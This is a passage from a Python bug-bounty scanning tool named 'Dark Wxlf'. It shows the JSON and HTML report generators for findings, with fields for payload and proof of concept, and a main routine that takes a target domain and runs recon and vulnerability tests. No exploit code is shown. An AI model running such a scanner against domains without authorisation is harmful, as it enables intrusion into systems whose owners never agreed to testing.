                'type': f['type'],
                'severity': f['severity'],
                'cvss': f.get('cvss', 'N/A'),
                'url': f['url'],
                'parameter': f['param'],
                'payload': f['payload'],
                'evidence': f['evidence'],
                'impact': f['impact'],
                'remediation': f['fix'],
                'poc': f['poc']
            }
            report['findings'].append(finding)
        
        fname = f"bug_bounty_report_{self.target}_{timestamp}.json"
        with open(fname, 'w') as file:
            json.dump(report, file, indent=2)
        
        self.log(f"JSON report saved: {fname}", "success")
        return fname
    
    def generate_html_report(self, findings, crit, high, med, low, timestamp):
        """Generate HTML report with styling"""
        
        # severity colors
        sev_colors = {
            'CRITICAL': '#dc3545',
            'HIGH': '#fd7e14',
            'MEDIUM': '#ffc107',
            'LOW': '#17a2b8',
            'UNKNOWN': '#6c757d'
        }
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Dark Wxlf Report - {self.target}</title>
    <meta charset="utf-8">
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #1a1a1a;
            color: #e0e0e0;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: #2d2d2d;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }}
        h1 {{
            color: #ff4444;
            border-bottom: 3px solid #ff4444;
            padding-bottom: 10px;
        }}
        .header {{
            margin-bottom: 30px;
        }}
        .summary {{
            background: #1a1a1a;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }}
        .stat {{
            display: inline-block;
            margin: 10px 20px 10px 0;
            padding: 10px 20px;
            border-radius: 5px;
            font-weight: bold;
        }}
        .critical {{ background: #dc3545; }}
        .high {{ background: #fd7e14; }}
        .medium {{ background: #ffc107; color: #000; }}
        .low {{ background: #17a2b8; }}
        .finding {{
            background: #1a1a1a;
            margin: 20px 0;
            padding: 20px;
            border-left: 5px solid;
            border-radius: 5px;
        }}
        .finding-header {{
            font-size: 1.3em;
            margin-bottom: 15px;
            font-weight: bold;
        }}
        .detail {{
            margin: 10px 0;
        }}
        .label {{
            color: #888;
            font-weight: bold;
        }}
        .poc {{
            background: #0d0d0d;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            white-space: pre-wrap;
            margin-top: 10px;
        }}
        .waf-warning {{
            background: #856404;
            color: #ffc107;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐺 DARK WXLF - BUG BOUNTY REPORT</h1>
            <p><strong>Target:</strong> {self.target}</p>
            <p><strong>Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>By:</strong> GhxstSh3ll</p>
"""
        
        if self.waf_detected:
            html += f"""
            <div class="waf-warning">
                ⚠️ WAF Detected: {', '.join(self.waf_detected)}
            </div>
"""
        
        html += f"""
        </div>
        
        <div class="summary">
            <h2>Executive Summary</h2>
            <div>
                <span class="stat critical">CRITICAL: {crit}</span>
                <span class="stat high">HIGH: {high}</span>
                <span class="stat medium">MEDIUM: {med}</span>
                <span class="stat low">LOW: {low}</span>
            </div>
            <p style="margin-top: 20px;"><strong>Total Findings:</strong> {len(findings)}</p>
        </div>
"""
        
        for i, f in enumerate(findings, 1):
            severity = f['severity']
            color = sev_colors.get(severity, '#6c757d')
            
            html += f"""
        <div class="finding" style="border-left-color: {color};">
            <div class="finding-header" style="color: {color};">
                Finding #{i}: {f['type']}
            </div>
            <div class="detail">
                <span class="label">Severity:</span> <span style="color: {color};">{severity}</span> | 
                <span class="label">CVSS:</span> {f.get('cvss', 'N/A')}
            </div>
            <div class="detail">
                <span class="label">URL:</span> {f['url']}
            </div>
            <div class="detail">
                <span class="label">Parameter:</span> {f['param']}
            </div>
            <div class="detail">
                <span class="label">Payload:</span> <code>{f['payload']}</code>
            </div>
            <div class="detail">
                <span class="label">Evidence:</span> {f['evidence']}
            </div>
            <div class="detail">
                <span class="label">Impact:</span> {f['impact']}
            </div>
            <div class="detail">
                <span class="label">Remediation:</span> {f['fix']}
            </div>
            <div class="poc">
{f['poc']}
            </div>
        </div>
"""
        
        html += """
    </div>
</body>
</html>
"""
        
        fname = f"bug_bounty_report_{self.target}_{timestamp}.html"
        with open(fname, 'w') as file:
            file.write(html)
        
        self.log(f"HTML report saved: {fname}", "success")
        return fname
    
    def start(self):
        self.show_banner()
        
        print(colored("╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                   TARGET SELECTION                             ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        tgt = input(colored("[?] Enter target domain (e.g., example.com): ", 'yellow'))
        
        if not tgt:
            self.log("No target provided", "error")
            return
        
        print()
        
        try:
            self.passive_recon(tgt)
        except KeyboardInterrupt:
            self.log("\nStopped by user", "warning")
            return
        except Exception as e:
            self.log(f"Error: {str(e)}", "error")
            return
        
        try:
            self.active_recon()
        except KeyboardInterrupt:
            self.log("\nStopped by user", "warning")
            return
        
        self.analyze()
        
        # NEW: Advanced recon options
        try:
            self.advanced_recon_menu()
        except KeyboardInterrupt:
            self.log("\nStopped by user", "warning")
        
        # NEW: Output format selection
        self.output_format_menu()
        
        self.test_vulns()
        
        self.log(f"\nAll data saved to: {self.output}", "success")
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                      SCAN COMPLETE                             ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))

def main():
    try:
        tool = DarkWxlf()
        tool.start()
    except KeyboardInterrupt:
        print(colored("\n\n[!] Terminated by user", 'red'))
        sys.exit(0)
    except Exception as e:
        print(colored(f"\n[!] Error: {str(e)}", 'red'))
        sys.exit(1)

if __name__ == "__main__":
    main()
